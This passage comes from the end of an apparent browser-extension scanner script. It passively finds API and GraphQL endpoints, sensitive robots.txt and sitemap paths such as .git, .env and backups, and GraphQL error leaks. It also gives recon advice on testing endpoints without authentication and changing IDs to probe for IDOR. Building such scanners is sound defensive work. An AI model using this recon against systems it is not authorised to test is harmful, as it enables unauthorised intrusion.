  }

  // ── 45. API Endpoint Discovery Enhancement (#38) ──

  // P2: recognizers for directly-observable resources. These are TIER-3 (the resource is
  // directly present — its own existence is the proof), severity info (never crit/high).
  function detectObservableFiles(ctx) {
    const findings = [];
    const url = ctx.url;
    let path = url; try { path = new URL(url).pathname; } catch {}
    const ctype = ((typeof document !== "undefined" && document.contentType) || "").toLowerCase();
    const body = ((typeof document !== "undefined" && document.body && document.body.textContent) || "").slice(0, 40000);
    const ev = (proof) => ({ proof, technique: "direct-observation", request: null, response: body.slice(0, 300), timestamp: Date.now() });

    if (/(^|\/)robots\.txt$/i.test(path)) {
      const paths = (body.match(/^\s*Disallow:\s*(\S+)/gim) || []).map(l => l.replace(/^\s*Disallow:\s*/i, ""));
      const sensitive = paths.filter(p => /admin|\.git|phpmyadmin|backup|config|private|internal|secret|db|sql|wp-admin|\.env|api|user/i.test(p));
      findings.push({ type: "Observable — robots.txt", severity: "info", tier: 3, detail: `robots.txt is present${sensitive.length ? ` and references ${sensitive.length} sensitive path(s): ${sensitive.slice(0, 8).join(", ")}` : ` (${paths.length} Disallow entries)`}`, location: url, category: "info-disclosure", subtype: "robots", evidenceObj: ev("robots.txt served at " + path) });
    } else if (/(^|\/)sitemap[\w-]*\.xml$/i.test(path) || (/xml/.test(ctype) && /<urlset|<sitemapindex/i.test(body))) {
      const locs = (body.match(/<loc>\s*([^<]+?)\s*<\/loc>/gi) || []);
      const sensitive = locs.filter(l => /admin|backup|\.sql|\.bak|internal|private|config|staging|dev|test/i.test(l));
      findings.push({ type: "Observable — sitemap.xml", severity: "info", tier: 3, detail: `sitemap.xml is present (${locs.length} URLs${sensitive.length ? `, ${sensitive.length} sensitive` : ""})`, location: url, category: "info-disclosure", subtype: "sitemap", evidenceObj: ev("sitemap.xml served at " + path) });
    } else if ((/json/.test(ctype) && /^\s*[\[{]/.test(body)) || (/\/(api|rest|v\d+)\//i.test(path) && /^\s*[\[{]/.test(body))) {
      const isGql = /\/graphql/i.test(path) || /"__schema"|"data"\s*:/.test(body);
      if (!isGql) findings.push({ type: "Observable — JSON API Endpoint", severity: "info", tier: 3, detail: `JSON API endpoint at ${path} returns structured data — review authorization and IDOR/BOLA on object identifiers`, location: url, category: "info-disclosure", subtype: "api-endpoint", evidenceObj: ev("JSON response at " + path) });
    }
    if (/\/graphql\b/i.test(path) || /"__schema"\s*:|"types"\s*:\s*\[\s*\{\s*"name"/.test(body)) {
      const introspection = /__schema|"types"\s*:\s*\[/.test(body);
      findings.push({ type: "Observable — GraphQL Endpoint", severity: "info", tier: 3, detail: `GraphQL endpoint at ${path}${introspection ? " — introspection appears enabled (schema exposed)" : ""}`, location: url, category: "info-disclosure", subtype: "graphql-endpoint", evidenceObj: ev("GraphQL response at " + path) });
    }
    return findings;
  }

  function detectAPIEndpoints(ctx) {
    const findings = [];
    const url = ctx.url;
    const html = ctx.html.slice(0, 150000);
    const scripts = ctx.inlineScripts.map(s => s.textContent).join("\n").slice(0, 150000);
    const combined = html + "\n" + scripts;
    const apiPatterns = [
      /["'](\/api\/v\d+\/[^"'\s]+)["']/g,
      /["'](\/api\/[^"'\s]+)["']/g,
      /["'](\/v\d+\/[^"'\s]+)["']/g,
      /["'](\/graphql[^"'\s]*)["']/g,
      /["'](\/rest\/[^"'\s]+)["']/g,
      /["'](\/internal\/[^"'\s]+)["']/g,
      /["'](\/private\/[^"'\s]+)["']/g,
      /["'](\/debug\/[^"'\s]+)["']/g,
      /fetch\s*\(\s*["'`]([^"'`\s]+)["'`]/g,
      /axios\.\w+\s*\(\s*["'`]([^"'`\s]+)["'`]/g,
      /\$\.(?:get|post|ajax)\s*\(\s*["'`]([^"'`\s]+)["'`]/g,
      /XMLHttpRequest[^;]*open\s*\(\s*["']\w+["']\s*,\s*["']([^"']+)["']/g,
    ];
    const endpoints = new Set();
    for (const pat of apiPatterns) {
      let m;
      while ((m = pat.exec(combined)) !== null) {
        const ep = m[1];
        if (ep && ep.length > 3 && ep.length < 200 && !ep.includes("{{") && !/\.(css|js|png|jpg|gif|svg|ico|woff)$/i.test(ep)) {
          endpoints.add(ep);
        }
      }
    }
    if (endpoints.size > 0) {
      const epList = [...endpoints].slice(0, 30);
      findings.push({
        type: "Recon — API Endpoints Discovered",
        severity: "info",
        detail: `${endpoints.size} API endpoint(s) found in JS/HTML: ${epList.slice(0, 8).join(", ")}${endpoints.size > 8 ? "..." : ""}`,
        location: url,
        category: "recon",
        suggestion: `Discovered API endpoints:\n${epList.map(e => `• ${e}`).join("\n")}\n\nTest each endpoint:\n• Access without authentication\n• Try different HTTP methods (GET, POST, PUT, DELETE, PATCH)\n• Add ?debug=1 or ?verbose=true\n• Check for IDOR by changing ID values\n• Look for undocumented parameters`
      });
    }
    const robotsMeta = document.querySelector('meta[name="robots"]');
    if (robotsMeta) {
      const content = robotsMeta.getAttribute("content") || "";
      if (/noindex|nofollow/i.test(content)) {
        findings.push({
          type: "Recon — Robots Meta Noindex",
          severity: "info",
          detail: `Page has robots noindex/nofollow — may be hiding sensitive content`,
          location: url,
          category: "recon",
        });
      }
    }
    const sitemapLink = document.querySelector('link[rel="sitemap"], a[href*="sitemap.xml"], a[href*="sitemap_index"]');
    if (sitemapLink) {
      findings.push({
        type: "Recon — Sitemap Reference",
        severity: "info",
        detail: `Sitemap reference found: ${truncate(sitemapLink.href || sitemapLink.getAttribute("href") || "", 80)}`,
        location: url,
        category: "recon",
        suggestion: "Fetch sitemap.xml for complete URL map. May reveal hidden admin, API, or staging endpoints."
      });
    }
    return findings;
  }

  // ══════════════════════════════════════════════════════════════════
  // 46. GraphQL Endpoint Detection (passive)
  // ══════════════════════════════════════════════════════════════════
  function detectGraphQL(ctx) {
    const findings = [];
    const html = ctx.html.slice(0, 200000);
    const scripts = ctx.inlineScripts.map(s => s.textContent).join("\n").slice(0, 200000);
    const pageUrl = ctx.url;
    let origin;
    try { origin = new URL(pageUrl).origin; } catch { return findings; }

    const seen = new Set();
    const discoveredEndpoints = [];

    function addEndpoint(raw, source) {
      let abs;
      try { abs = new URL(raw, pageUrl).href; } catch { return; }
      if (seen.has(abs)) return;
      seen.add(abs);
      discoveredEndpoints.push({ url: abs, source });
      findings.push({
        type: "GraphQL Endpoint Detected",
        category: "graphql",
        severity: "info",
        detail: `GraphQL endpoint found: ${abs} (source: ${source})`,
        subtype: "endpoint-detection",
        evidence: abs,
        location: pageUrl,
      });
    }

    // --- 1a. <script src> references ---
    for (const s of ctx.allScripts) {
      const src = s.getAttribute("src") || "";
      if (/graphql|\/gql\b|apollo|urql|relay/i.test(src)) {
        findings.push({
          type: "GraphQL Client Library",
          category: "graphql",
          severity: "info",
          detail: `GraphQL client library loaded: ${src}`,
          subtype: "client-library",
          evidence: src,
          location: pageUrl,
        });
      }
    }

    // --- 1b. Endpoint URLs in HTML attributes ---
    const GQL_PATH_RE = /\/graphql\b|\/api\/graph\b|\/gql\b/i;

    for (const a of document.querySelectorAll("a[href]")) {
      const href = a.getAttribute("href") || "";
      if (GQL_PATH_RE.test(href)) addEndpoint(href, "a[href]");
    }
    for (const f of ctx.forms) {
      const action = f.getAttribute("action") || "";
      if (GQL_PATH_RE.test(action)) addEndpoint(action, "form[action]");
    }

    // --- 1c. Endpoint URLs in inline JS ---
    const jsUrlPatterns = [
      /["'`]((?:https?:\/\/[^"'`\s]*)?\/graphql[^"'`\s]*)["'`]/gi,
      /["'`]((?:https?:\/\/[^"'`\s]*)?\/api\/graph[^"'`\s]*)["'`]/gi,
      /["'`]((?:https?:\/\/[^"'`\s]*)?\/gql\b[^"'`\s]*)["'`]/gi,
    ];
    for (const pat of jsUrlPatterns) {
      let m;
      while ((m = pat.exec(scripts)) !== null) {
        const ep = m[1];
        if (ep && ep.length < 300) addEndpoint(ep, "inline-js");
      }
    }

    // Also scan combined HTML for fetch/XHR calls to graphql paths
    const fetchGqlRe = /(?:fetch|axios\.\w+|\$\.(?:post|get|ajax)|\.open\s*\(\s*["']\w+["']\s*,)\s*["'`]([^"'`\s]+(?:graphql|\/api\/graph|\/gql)[^"'`\s]*)["'`]/gi;
    let m;
    while ((m = fetchGqlRe.exec(html)) !== null) {
      if (m[1] && m[1].length < 300) addEndpoint(m[1], "fetch/xhr");
    }

    // --- 1d. GraphQL client library detection in inline scripts ---
    const GQL_CLIENTS = [
      { re: /ApolloClient|@apollo\/client|apollo-boost/i, name: "Apollo Client" },
      { re: /\burql\b|@urql\/core/i, name: "urql" },
      { re: /\bRelayEnvironment\b|relay-runtime/i, name: "Relay" },
      { re: /graphql-request/i, name: "graphql-request" },
      { re: /@graphql-codegen/i, name: "GraphQL Codegen" },
      { re: /createGraphQLClient|GraphQLClient\s*\(/i, name: "Generic GraphQL Client" },
    ];
    for (const lib of GQL_CLIENTS) {
      if (lib.re.test(scripts)) {
        findings.push({
          type: "GraphQL Client Library",
          category: "graphql",
          severity: "info",
          detail: `${lib.name} detected in inline scripts`,
          subtype: "client-library",
          evidence: lib.name,
          location: pageUrl,
        });
      }
    }

    // --- 2. GraphQL operation patterns in inline JS ---
    const opPatterns = [
      { re: /__schema\s*\{|introspectionQuery|IntrospectionQuery/i, label: "Introspection query usage", sub: "introspection-usage" },
      { re: /__type\s*\(\s*name\s*:/i, label: "Type introspection query", sub: "introspection-usage" },
      { re: /mutation\s*\{[^}]{2,}/i, label: "GraphQL mutation in client JS", sub: "mutation-pattern" },
      { re: /mutation\s+\w+\s*[\({]/i, label: "Named GraphQL mutation", sub: "mutation-pattern" },
      { re: /fragment\s+\w+\s+on\s+\w+\s*\{/i, label: "GraphQL fragment (indicates complex schema)", sub: "fragment-pattern" },
    ];
    for (const op of opPatterns) {
      if (op.re.test(scripts)) {
        findings.push({
          type: "GraphQL Operation Pattern",
          category: "graphql",
          severity: "info",
          detail: op.label,
          subtype: op.sub,
          location: pageUrl,
        });
      }
    }

    // --- 3. GraphQL error patterns in HTML (server responses rendered on page) ---
    const errorPatterns = [
      { re: /Cannot query field\s+'[^']+'\s+on type\s+'[^']+'/i, label: "GraphQL field error leaked in response", sev: "medium" },
      { re: /"code"\s*:\s*"UNAUTHORIZED"/i, label: "GraphQL UNAUTHORIZED error visible", sev: "info" },
      { re: /"code"\s*:\s*"FORBIDDEN"/i, label: "GraphQL FORBIDDEN error visible", sev: "info" },
      { re: /GraphQL error[:\s]/i, label: "GraphQL error message in page", sev: "info" },
      { re: /Syntax Error:.*Expected.*got/i, label: "GraphQL syntax error leaked", sev: "medium" },
    ];
    for (const ep of errorPatterns) {
      if (ep.re.test(html)) {
        findings.push({
          type: "GraphQL Error Disclosure",
          category: "graphql",
          severity: ep.sev,
          detail: ep.label,
          subtype: "error-disclosure",
          location: pageUrl,
        });
      }
    }

    // --- 4. Mutation/query patterns in external script URLs from admin bundles ---
    for (const s of ctx.allScripts) {
      const src = s.getAttribute("src") || "";
      if (/admin\b/i.test(src) && /\.js(\?|$)/.test(src)) {
        findings.push({
          type: "GraphQL Admin Bundle",
          category: "graphql",
          severity: "low",
          detail: `Admin JS bundle detected: ${src} — may contain GraphQL operations for schema enumeration`,
          subtype: "admin-bundle",
          evidence: src,
          location: pageUrl,
        });
      }
    }

    // --- 5. Notify background of discovered endpoints ---
    if (discoveredEndpoints.length > 0) {
      try {
        const domain = new URL(pageUrl).hostname;
        chrome.runtime.sendMessage({
          type: "GRAPHQL_DISCOVERED",
          endpoints: discoveredEndpoints,
          domain: domain,
        });
      } catch (e) {
        dbgWarn("GraphQL discovery notify error:", e.message);
      }
    }

    return findings;
  }

  // ── Utilities ──

  function truncate(str, max) {
    return str && str.length > max ? str.slice(0, max) + "…" : str || "";
  }

  function isBase64(str) {
    if (str.length % 4 !== 0) return false;
    return /^[A-Za-z0-9+/]+=*$/.test(str);
  }

  // ── SPA MutationObserver ──
  const SPA_TAGS = new Set(["FORM", "SCRIPT", "A", "INPUT", "TEXTAREA", "SELECT", "IFRAME"]);
  const scannedElements = new WeakSet();
  let spaRescanCount = 0;
  const SPA_MAX_RESCANS = 5;
  let spaDebounceTmr = null;

  function setupMutationObserver() {
    if (!document.body) return;

    const observer = new MutationObserver((mutations) => {
      if (spaRescanCount >= SPA_MAX_RESCANS) return;
      let hasNew = false;
      for (const m of mutations) {
        for (const node of m.addedNodes) {
          if (node.nodeType !== 1) continue;
          if (SPA_TAGS.has(node.tagName) && !scannedElements.has(node)) { hasNew = true; break; }
          if (node.querySelector && node.querySelector("form, script, a, input, textarea, select, iframe")) { hasNew = true; break; }
        }
        if (hasNew) break;
      }
      if (!hasNew) return;
      clearTimeout(spaDebounceTmr);
      spaDebounceTmr = setTimeout(spaScan, 2000);
    });

    observer.observe(document.body, { childList: true, subtree: true });
  }

  function spaScan() {
    if (spaRescanCount >= SPA_MAX_RESCANS) return;
    spaRescanCount++;
    dbg(`🔄 SPA mutation re-scan #${spaRescanCount}`);
    const t0 = performance.now();

    const newForms = [...document.querySelectorAll("form")].filter(el => !scannedElements.has(el));
    const newScripts = [...document.querySelectorAll("script:not([src])")].filter(el => !scannedElements.has(el));
    const newInputs = [...document.querySelectorAll("input, textarea, select")].filter(el => !scannedElements.has(el));
    const newLinks = [...document.querySelectorAll("a")].filter(el => !scannedElements.has(el));
    const newIframes = [...document.querySelectorAll("iframe")].filter(el => !scannedElements.has(el));

    if (newForms.length + newScripts.length + newInputs.length + newLinks.length + newIframes.length === 0) {
      dbg("SPA scan: no new elements found");
      return;
    }

    const allNew = [...newForms, ...newScripts, ...newInputs, ...newLinks, ...newIframes];
    allNew.forEach(el => scannedElements.add(el));

    // P1 (cross-route attribution): scope the re-scan HTML to ONLY the newly-added elements.
    // Using the whole document here re-detected the persistent app-shell (nav, layout forms,
    // global scripts, keyword text) on every SPA route and re-stamped it onto each new URL —
    // findings bled across routes. Scanning just the new elements keeps each finding attributed
    // to the exact route where its content actually appeared.
    const spaRawHtml = allNew.map(el => { try { return el.outerHTML || ""; } catch { return ""; } }).join("\n");
    const spaHtml = spaRawHtml.length > 2 * 1024 * 1024 ? spaRawHtml.slice(0, 2 * 1024 * 1024) : spaRawHtml;

    const ctx = {
      url: window.location.href,
      html: spaHtml,
      forms: newForms,
      inlineScripts: newScripts,
      allScripts: newScripts,
      cookies: document.cookie,
      metas: [...document.querySelectorAll("meta")],
      links: [...document.querySelectorAll("link")],
      inputs: newInputs,
    };

    const findings = [];
    const push = (f) => { if (f) findings.push(f); };
    const pushAll = (arr) => { if (arr) arr.forEach(f => findings.push(f)); };

    pushAll(analyzeForms(ctx));
    pushAll(analyzeJSSinks(ctx));
    pushAll(discoverEndpoints(ctx));
    pushAll(detectXSS(ctx));
    pushAll(detectSQLInjection(ctx));
    pushAll(detectCSRF(ctx));
    pushAll(detectInfoDisclosure(ctx));

    const ms = (performance.now() - t0).toFixed(0);

    if (findings.length > 0) {
      const url = window.location.href;
      const payload = {
        url,
        timestamp: new Date().toISOString(),
        title: document.title,
        source: "spa-mutation",
        rescan: spaRescanCount,
        findings,
        summary: {
          total: findings.length,
          critical: findings.filter(f => f.severity === "critical").length,
          high: findings.filter(f => f.severity === "high").length,
          medium: findings.filter(f => f.severity === "medium").length,
          low: findings.filter(f => f.severity === "low").length,
          info: findings.filter(f => f.severity === "info").length,
        },
      };
      dbgOk(`SPA scan #${spaRescanCount} done in ${ms}ms — ${findings.length} findings`);
      try {
        chrome.runtime.sendMessage({ type: "AUTO_SCAN_RESULTS", payload });
      } catch (e) {
        dbgWarn("SPA scan send error:", e.message);
      }
    } else {
      dbg(`SPA scan #${spaRescanCount} done in ${ms}ms — 0 findings`);
    }
  }

  if (extensionEnabled) {
    if (document.body) {
      setupMutationObserver();
    } else {
      window.addEventListener("DOMContentLoaded", setupMutationObserver);
    }
  }


})();

// ═══ FREE BUILD STUBS ═══
function captureJSFiles(){}
function initCopilot(){}
function sendPageContext(){}
function createCopilotUI(){}
function showCopilotSuggestions(){}
function capturePageContext(){ return {}; }
let copilotEnabled = false;
